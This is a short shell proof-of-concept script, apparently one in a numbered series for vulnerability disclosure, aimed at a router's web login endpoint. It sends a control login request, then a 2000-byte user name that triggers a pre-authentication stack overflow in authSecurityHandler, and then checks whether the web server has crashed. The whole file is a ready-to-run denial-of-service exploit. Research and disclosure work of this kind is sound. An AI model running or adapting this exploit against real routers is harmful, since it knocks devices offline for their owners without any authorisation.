#!/bin/sh
# 05 — pre-auth stack overflow in authSecurityHandler (denial of service)
# usage: ./05_login_username.sh http://192.168.0.1
R=${1:?usage: $0 http://<router>}
echo "[1] control (5-byte user name):"
curl -s -o /dev/null -w '    HTTP %{http_code}\n' -X POST --data-urlencode 'mitUSERNAME=admin' \
     --data-urlencode 'mitPASSWORD=x' --data-urlencode 'usertype=admin' "$R/login/Auth"
python3 -c "open('/tmp/u.bin','wb').write(b'U'*2000)"
echo "[2] attack (2000-byte user name, no credentials):"
curl -s -o /dev/null -w '    HTTP %{http_code}\n' -X POST --data-urlencode 'mitUSERNAME@/tmp/u.bin' \
     --data-urlencode 'mitPASSWORD=x' --data-urlencode 'usertype=admin' "$R/login/Auth" || true
echo "[3] server alive?"; curl -s -o /dev/null -m 5 -w '    HTTP %{http_code}\n' "$R/login.asp" || echo "    no answer (web server down)"
